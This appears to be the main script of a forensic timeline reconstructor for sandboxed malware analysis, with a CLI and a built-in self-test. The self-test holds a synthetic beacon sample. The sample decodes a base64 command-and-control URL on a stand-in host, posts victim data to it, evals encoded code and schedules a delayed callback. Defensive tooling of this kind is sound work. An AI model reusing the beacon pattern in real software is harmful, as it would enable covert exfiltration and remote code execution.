#!/usr/bin/env node
/**
 * Forensic Timeline Reconstructor — rebuild a chronological, dual-clock view of
 * one analysis run and emit Markdown or JSON.
 *
 *   node app.mjs --sample samples/staged-beacon.js --out timeline.md
 *   node app.mjs --report report.json --json --gap-threshold 500
 *   node app.mjs --self-test
 */

import { mkdtemp, readFile, rm, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { analyzeSample } from '../../../tools/index.js'
import { buildTimeline, detectGaps, detectAnomalies, STAGES } from './lib/timeline.js'
import { renderTimelineMarkdown, renderTimelineJson } from './lib/render.js'

const args = process.argv.slice(2)
const flag = (name) => args.includes(name)
const value = (name, fallback) => {
  const index = args.indexOf(name)
  return index >= 0 && args[index + 1] ? args[index + 1] : fallback
}

function printHelp() {
  console.log(`Forensic Timeline Reconstructor
  --sample <path>        analyse a sample, then reconstruct its timeline
  --report <path>        reconstruct from an existing report JSON
  --out <path>           write the Markdown dossier
  --json                 print the JSON timeline instead of Markdown
  --gap-threshold <ms>   virtual-clock gap threshold (default 250)
  --layers <a,b>         restrict to static,dynamic,artifact
  --host-clock           include the untrusted host wall clock
  --max-rows <n>         timeline rows kept in Markdown (default 400)
  --self-test            run the built-in validation
  --help                 this help`)
}

/** Analyse a source string and reconstruct its timeline. */
export async function timelineSource(source, options = {}) {
  const analysis = await analyzeSample(source, {
    name: options.name ?? 'sample.js',
    logLevel: 'silent',
    seed: options.seed ?? 0x5eed,
    network: options.network ?? { policy: 'deny' },
  })
  return { report: analysis.report, ...buildTimeline(analysis.report, options) }
}

/** Reconstruct from an existing report object. */
export function timelineReport(report, options = {}) {
  return buildTimeline(report, options)
}

function assert(condition, message) {
  if (!condition) throw new Error(`self-test: ${message}`)
}

function syntheticEntries(offsets, stages) {
  return offsets.map((offsetMs, index) => ({
    id: `synthetic:${index}`,
    layer: 'dynamic',
    phase: 'run',
    stage: stages[index],
    action: `probe.${index}`,
    detail: '',
    virtualMs: 1_000_000 + offsetMs,
    virtualIso: new Date(1_000_000 + offsetMs).toISOString(),
    offsetMs,
    seq: index + 1,
    hostOffsetMs: null,
  }))
}

async function selfTest() {
  const directory = await mkdtemp(join(tmpdir(), 'forensic-timeline-'))
  try {
    // Unit: gap detection honours the threshold and reports direction.
    const gapped = syntheticEntries([0, 100, 2100], ['execution', 'execution', 'execution'])
    const gaps = detectGaps(gapped, 250)
    assert(gaps.length === 1, `expected 1 gap, got ${gaps.length}`)
    assert(gaps[0].deltaMs === 2000, `expected a 2000ms gap, got ${gaps[0].deltaMs}`)
    assert(detectGaps(gapped, 5000).length === 0, 'gap threshold was not applied')

    // Unit: network activity before any execution is a structural inversion.
    const inverted = syntheticEntries([0, 100], ['command-and-control', 'execution'])
    const inversions = detectAnomalies(inverted, {}).filter((anomaly) => anomaly.code === 'STAGE_ORDER_INVERSION')
    assert(inversions.length === 1, 'stage inversion was not reported')
    assert(detectAnomalies(syntheticEntries([0, 100], ['execution', 'command-and-control']), {}).length === 0, 'clean stage order reported an anomaly')

    const sample = [
      'var cfg = atob("aHR0cHM6Ly9jMi5leGFtcGxlLnRlc3QvYmVhY29u");',
      'fetch(cfg, { method: "POST", body: btoa("victim") }).catch(function(){});',
      'eval(atob("Y29uc29sZS5sb2coMSk="));',
      'localStorage.setItem("stage", "2");',
      'document.write("<div>ok</div>");',
      'setTimeout(function(){ fetch("https://c2.example.test/late").catch(function(){}); }, 1500);',
    ].join('\n')
    const timeline = await timelineSource(sample, { name: 'staged-beacon.js', gapThresholdMs: 250 })
    assert(timeline.entries.length > 20, `timeline too small: ${timeline.entries.length}`)
    assert(timeline.summary.dynamic > 10, 'dynamic layer missing from the timeline')
    assert(timeline.summary.static > 0, 'static layer missing from the timeline')
    assert(timeline.summary.artifacts > 0, 'artifact layer missing from the timeline')

    // Ordering: within the run phase the virtual offset and sequence never go backwards.
    const run = timeline.entries.filter((entry) => entry.phase === 'run')
    for (let index = 1; index < run.length; index += 1) {
      const previous = run[index - 1]
      const current = run[index]
      const ordered = current.offsetMs > previous.offsetMs || (current.offsetMs === previous.offsetMs && current.seq >= previous.seq)
      assert(ordered, `timeline is out of order at ${current.id}`)
    }

    // Stage markers: the sample must surface every stage it exercises.
    const stages = new Set(timeline.summary.stages)
    for (const expected of ['initialization', 'execution', 'persistence', 'injection', 'command-and-control', 'collection']) {
      assert(stages.has(expected), `missing stage marker ${expected} (have: ${[...stages].join(', ')})`)
    }
    assert(STAGES.length === timeline.stageOrder.length, 'stage order table is inconsistent')
    const execution = timeline.markers.find((marker) => marker.stage === 'execution')
    const c2 = timeline.markers.find((marker) => marker.stage === 'command-and-control')
    assert(execution.offsetMs <= c2.offsetMs, 'command-and-control precedes first execution')

    // Clocks: virtual ISO is exactly base + offset for every run entry.
    for (const entry of run) {
      assert(Date.parse(entry.virtualIso) === timeline.clocks.virtualBaseMs + entry.offsetMs, `virtual clock mismatch on ${entry.id}`)
    }

    // Deferred execution (1500ms timer) must be visible as a gap.
    assert(timeline.gaps.length >= 1, 'no virtual-clock gap detected for the deferred timer')
    assert(timeline.gaps.some((gap) => gap.deltaMs >= 1400), 'deferred timer gap was not reported')
    assert(timeline.clocks.hostClock === 'excluded', 'host clock must be excluded by default')

    // Artifacts are re-attached to their trace sequence when the source names one.
    const resolved = timeline.entries.filter((entry) => entry.layer === 'artifact' && entry.phase === 'run')
    assert(resolved.length >= 1, 'no artifact was correlated to a trace sequence')

    // Determinism: two reconstructions are byte-identical.
    const repeat = await timelineSource(sample, { name: 'staged-beacon.js', gapThresholdMs: 250 })
    assert(JSON.stringify(renderTimelineJson(repeat)) === JSON.stringify(renderTimelineJson(timeline)), 'timeline is not deterministic')

    // Layer filtering keeps only the requested evidence class.
    const dynamicOnly = buildTimeline(timeline.report, { layers: ['dynamic'] })
    assert(dynamicOnly.entries.every((entry) => entry.layer === 'dynamic'), 'layer filter leaked other layers')

    // Host clock is opt-in and additive.
    const withHost = await timelineSource(sample, { name: 'staged-beacon.js', includeHostClock: true })
    assert(withHost.clocks.hostClock.startsWith('included'), 'host clock was not included on request')
    assert(withHost.entries.some((entry) => Number.isFinite(entry.hostOffsetMs)), 'host offsets missing')

    // Empty reports degrade to an explicit anomaly instead of throwing.
    const empty = buildTimeline({})
    assert(empty.anomalies.some((anomaly) => anomaly.code === 'EMPTY_TRACE'), 'empty report was not flagged')

    const markdown = renderTimelineMarkdown(timeline, { maxRows: 50 })
    for (const heading of ['## 1. 阶段标记', '## 2. 执行时间线', '## 3. 时间空洞', '## 4. 异常']) {
      assert(markdown.includes(heading), `markdown missing section ${heading}`)
    }
    const out = join(directory, 'timeline.md')
    await writeFile(out, markdown, 'utf8')
    const written = await readFile(out, 'utf8')
    assert(written.includes('Forensic timeline'), 'markdown file was not written')

    console.log(
      `timeline: entries=${timeline.summary.entries} static=${timeline.summary.static} dynamic=${timeline.summary.dynamic} ` +
        `artifacts=${timeline.summary.artifacts} gaps=${timeline.summary.gaps} stages=${timeline.summary.stages.length}`,
    )
    console.log('SELFTEST OK')
  } finally {
    await rm(directory, { recursive: true, force: true })
  }
}

async function main() {
  if (flag('--help')) return printHelp()
  if (flag('--self-test')) return selfTest()

  const samplePath = value('--sample')
  const reportPath = value('--report')
  if (!samplePath && !reportPath) {
    printHelp()
    process.exitCode = 2
    return
  }
  const options = {
    gapThresholdMs: value('--gap-threshold') ? Number(value('--gap-threshold')) : undefined,
    layers: value('--layers') ? String(value('--layers')).split(',').map((item) => item.trim()).filter(Boolean) : undefined,
    includeHostClock: flag('--host-clock'),
    maxRows: value('--max-rows') ? Number(value('--max-rows')) : undefined,
  }
  const timeline = samplePath
    ? await timelineSource(await readFile(samplePath, 'utf8'), { ...options, name: samplePath })
    : timelineReport(JSON.parse(await readFile(reportPath, 'utf8')), options)
  const markdown = renderTimelineMarkdown(timeline, options)
  if (flag('--json')) console.log(JSON.stringify(renderTimelineJson(timeline, options), null, 2))
  else console.log(markdown)
  const out = value('--out')
  if (out) {
    await writeFile(out, markdown, 'utf8')
    console.error(`wrote ${out}`)
  }
}

if (import.meta.url === `file://${process.argv[1]}`) {
  main().catch((error) => {
    console.error(`error: ${error.message}`)
    process.exitCode = 1
  })
}
